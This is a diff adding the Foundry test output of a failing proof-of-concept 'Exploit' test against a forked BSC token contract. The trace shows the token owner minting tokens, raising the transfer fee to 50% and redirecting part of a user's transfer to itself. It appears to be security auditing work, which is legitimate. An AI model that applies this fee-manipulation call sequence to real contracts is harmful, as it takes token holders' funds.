@@ -1,0 +1,80 @@
+No files changed, compilation skipped
+2026-06-16T10:10:55.995324Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/bsc/104547934"
+
+Ran 1 test for test/Exploit.t.sol:ExploitTest
+[FAIL: assertion failed: 500 != 1567355486196520713] testManipulateFee() (gas: 139481)
+Logs:
+  Owner: 0x0000000000000000000000000000000000000001
+
+2026-06-16T10:11:02.122164Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:11:02.122541Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:11:02.122626Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:11:02.122698Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:11:02.122912Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:11:02.124484Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:11:02.125000Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:11:02.817782Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:11:02.817916Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:11:02.856888Z  WARN traces::etherscan: could not get etherscan info: ErrorResponse { status: "0", message: "NOTOK", result: Some("Max calls per sec rate limit reached (3/sec)") }
+2026-06-16T10:11:02.859998Z  WARN traces::etherscan: could not get etherscan info: ErrorResponse { status: "0", message: "NOTOK", result: Some("Max calls per sec rate limit reached (3/sec)") }
+Traces:
+  [17079] ExploitTest::setUp()
+    ├─ [0] VM::label(CoinToken: [0xF44DE2b8731cD69d4A727Da0214874aE35559426], "CoinToken")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Attacker: [0x000000000000000000000000000000000000dEaD], "Attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(User: [0x000000000000000000000000000000000000bEEF], "User")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Recipient: [0x000000000000000000000000000000000000cafE], "Recipient")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [139481] ExploitTest::testManipulateFee()
+    ├─ [2672] CoinToken::owner() [staticcall]
+    │   └─ ← [Return] Owner: [0x0000000000000000000000000000000000000001]
+    ├─ [0] VM::label(Owner: [0x0000000000000000000000000000000000000001], "Owner")
+    │   └─ ← [Return]
+    ├─ emit log_named_address(key: "Owner", val: Owner: [0x0000000000000000000000000000000000000001])
+    ├─ [568] CoinToken::paused() [staticcall]
+    │   └─ ← [Return] false
+    ├─ [2382] CoinToken::decimals() [staticcall]
+    │   └─ ← [Return] 9
+    ├─ [0] VM::prank(Owner: [0x0000000000000000000000000000000000000001])
+    │   └─ ← [Return]
+    ├─ [31734] CoinToken::mint(User: [0x000000000000000000000000000000000000bEEF], 1000000000000 [1e12])
+    │   ├─ emit Mint(from: 0x0000000000000000000000000000000000000000, to: User: [0x000000000000000000000000000000000000bEEF], value: 1000000000000 [1e12])
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: User: [0x000000000000000000000000000000000000bEEF], value: 1000000000000 [1e12])
+    │   └─ ← [Stop]
+    ├─ [679] CoinToken::balanceOf(User: [0x000000000000000000000000000000000000bEEF]) [staticcall]
+    │   └─ ← [Return] 1000000000000 [1e12]
+    ├─ [2606] CoinToken::FeeAddress() [staticcall]
+    │   └─ ← [Return] 0x9c2ccc6A98dF8FB70d79d03063154666581f17E2
+    ├─ [2679] CoinToken::balanceOf(0x9c2ccc6A98dF8FB70d79d03063154666581f17E2) [staticcall]
+    │   └─ ← [Return] 1567355486196520213 [1.567e18]
+    ├─ [0] VM::prank(Owner: [0x0000000000000000000000000000000000000001])
+    │   └─ ← [Return]
+    ├─ [13834] CoinToken::updateFee(50, 0, Owner: [0x0000000000000000000000000000000000000001])
+    │   └─ ← [Stop]
+    ├─ [690] CoinToken::txFee() [staticcall]
+    │   └─ ← [Return] 50
+    ├─ [0] VM::prank(User: [0x000000000000000000000000000000000000bEEF])
+    │   └─ ← [Return]
+    ├─ [53679] CoinToken::transfer(Recipient: [0x000000000000000000000000000000000000cafE], 1000)
+    │   ├─ emit Transfer(from: User: [0x000000000000000000000000000000000000bEEF], to: Owner: [0x0000000000000000000000000000000000000001], value: 500)
+    │   ├─ emit Transfer(from: User: [0x000000000000000000000000000000000000bEEF], to: Recipient: [0x000000000000000000000000000000000000cafE], value: 500)
+    │   └─ ← [Return] true
+    ├─ [679] CoinToken::balanceOf(Owner: [0x0000000000000000000000000000000000000001]) [staticcall]
+    │   └─ ← [Return] 500
+    ├─ [0] VM::assertEq(500, 1567355486196520713 [1.567e18]) [staticcall]
+    │   └─ ← [Revert] assertion failed: 500 != 1567355486196520713
+    └─ ← [Revert] assertion failed: 500 != 1567355486196520713
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 6.12s (3.43s CPU time)
+
+Ran 1 test suite in 8.34s (6.12s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Exploit.t.sol:ExploitTest
+[FAIL: assertion failed: 500 != 1567355486196520713] testManipulateFee() (gas: 139481)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
